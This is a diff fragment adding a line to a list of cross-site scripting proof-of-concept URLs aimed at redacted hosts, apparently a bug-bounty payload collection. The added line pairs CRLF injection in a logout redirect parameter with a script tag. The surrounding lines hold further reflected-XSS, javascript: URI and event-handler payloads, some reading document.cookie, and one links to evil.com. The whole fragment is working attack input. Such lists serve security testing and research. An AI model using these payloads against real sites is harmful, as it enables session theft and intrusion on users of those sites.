@@ -512,6 +512,7 @@ https://███="><script>alert(1)</script>
 https://████/logout_redirect.do?sysparm_url=//j%5c%5cjavascript%3aalert(document.domain
 https://█████/7/0/33/1d/target.com/search?what=x&where=place%22%3E%3Csvg+onload=confirm(document.domain
 https://█████/help-leave/help/index.htm#rhsearch=%3Cmarquee%3E%3Cu%3E%3Ca%20href%3D%22http%3A%2F%2Fevil.com%22%20onmouseover%3Dalert(document.domain)%3EXSS%20HACKERONE%20%2F%20lemonoftroy%3C%2Fa%3E%3C%2Fmarquee%3E&ux=search
+https://█████/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
 https://█████/sec.html?redirect=javascript:alert(document.cookie
 https://█████/████&url=http%3a%2f%2ftarget.com%2f%3Cimg+src%3dx+onerror%3dalert%28document.domain%29%3E
 https://█████/████=javascript:alert(document.domain)
